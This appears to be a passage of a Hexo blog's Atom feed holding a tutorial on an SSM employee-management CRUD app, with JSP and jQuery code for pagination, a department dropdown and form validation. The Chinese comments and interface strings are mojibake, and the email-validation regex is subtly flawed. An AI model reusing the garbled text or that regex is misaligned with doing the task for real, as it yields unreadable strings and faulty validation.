()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ¸…ç©ºè¡¨å•æ ·å¼åŠå†…å®¹</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºæ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»æ–°å¢æŒ‰é’®å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…é™¤æ•°æ®ï¼Œè¡¨å•é‡ç½®</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚ï¼ŒæŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œæ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æŸ¥å‡ºæ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //æ˜¾ç¤ºéƒ¨é—¨ä¿¡æ¯åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒè¡¨å•æ•°æ®</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. æ‹¿åˆ°è¦æ£€éªŒçš„æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. æ ¡éªŒé‚®ç®±ä¿¡æ¯</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ˜¾ç¤ºæ ¡éªŒä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","ç”¨æˆ·åå¯ç”¨");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»ä¿å­˜ï¼Œä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line"><span class="xml">        //2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.åˆ¤æ–­ä¹‹å‰çš„ajaxç”¨æˆ·åæ ¡éªŒæ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.å‘é€ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                //å‘˜å·¥ä¿å­˜æˆåŠŸï¼š</span></span><br><span class="line"><span class="xml">                //1. å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">                $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                //2. æ¥åˆ°æœ€åä¸€é¡µï¼Œæ˜¾ç¤ºåˆšæ‰ä¿å­˜çš„æ•°æ®</span></span><br><span class="line"><span class="xml">                //å‘é€ajaxè¯·æ±‚æ˜¾ç¤ºæœ€åä¸€é¡µæ•°æ®å³å¯</span></span><br><span class="line"><span class="xml">                //å¯ä»¥å°†æ€»è®°å½•æ•°å½“ä½œé¡µç </span></span><br><span class="line"><span class="xml">                to_page(totalRecords);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ä¿å­˜&quot;&gt;&lt;a href=&quot;#ä¿å­˜&quot; class=&quot;headerlink&quot; title=&quot;ä¿å­˜&quot;&gt;&lt;/a&gt;ä¿å­˜&lt;/h1&gt;&lt;p&gt;URIï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;/emp/{id}   GET æŸ¥è¯¢å‘˜å·¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;/emp    POS
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/10/12-å‘˜å·¥ç®¡ç†ç³»ç»Ÿ-2</title>
    <link href="http://yoursite.com/2020/10/12/SSM-2020-10-12-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/12/SSM-2020-10-12-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-12T15:19:00.000Z</published>
    <updated>2021-02-21T04:57:58.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰ç«¯é¡µé¢"><a href="#å‰ç«¯é¡µé¢" class="headerlink" title="å‰ç«¯é¡µé¢"></a>å‰ç«¯é¡µé¢</h1><p>æ ¹æ®å‰é¢çš„æ•ˆæœå›¾åšä¸€ä¸ªå‰ç«¯é¡µé¢<br>list.jsp:<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="xml">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="xml">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆhttp://localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span 